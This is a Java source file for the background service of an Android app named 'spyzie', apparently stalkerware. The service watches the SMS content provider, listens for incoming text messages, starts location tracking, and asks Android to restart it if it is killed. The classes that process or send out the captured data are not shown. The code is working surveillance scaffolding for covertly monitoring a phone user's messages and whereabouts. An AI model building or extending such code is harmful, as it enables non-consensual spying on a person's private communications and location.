package com.tantd.spyzie.service;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Telephony;
import android.util.Log;

import androidx.annotation.Nullable;

import com.tantd.spyzie.SpyzieApplication;
import com.tantd.spyzie.di.module.ServiceModule;
import com.tantd.spyzie.receiver.SmsObserver;
import com.tantd.spyzie.receiver.SpyzieReceiver;
import com.tantd.spyzie.util.Constants;

public class MainService extends Service {

    private static final String DEBUG_SUB_TAG = "[" + MainService.class.getSimpleName() + "] ";

    private ContentObserver mContentObserver;

    private SpyzieReceiver mSpyzieReceiver;

    @Override
    public void onCreate() {
        createServiceComponent();
        super.onCreate();
        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onCreate()");

        mContentObserver = new SmsObserver(new Handler(), this);
        getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mContentObserver);
    }

    private void createServiceComponent() {
        SpyzieApplication.getInstance().createServiceComponent(new ServiceModule(this)).inject(this);
    }

    private void releaseServiceComponent() {
        SpyzieApplication.getInstance().releaseServiceComponent();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onStartCommand()");

        IntentFilter filter = new IntentFilter();
        filter.addAction(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
        mSpyzieReceiver = new SpyzieReceiver();
        registerReceiver(mSpyzieReceiver, filter);

        Intent locationServiceIntent = new Intent(this, LocationService.class);
        LocationService.enqueueWork(this, locationServiceIntent);

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onDestroy()");

        getContentResolver().unregisterContentObserver(mContentObserver);
        unregisterReceiver(mSpyzieReceiver);

        LocationService.stopAllWork();

        releaseServiceComponent();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
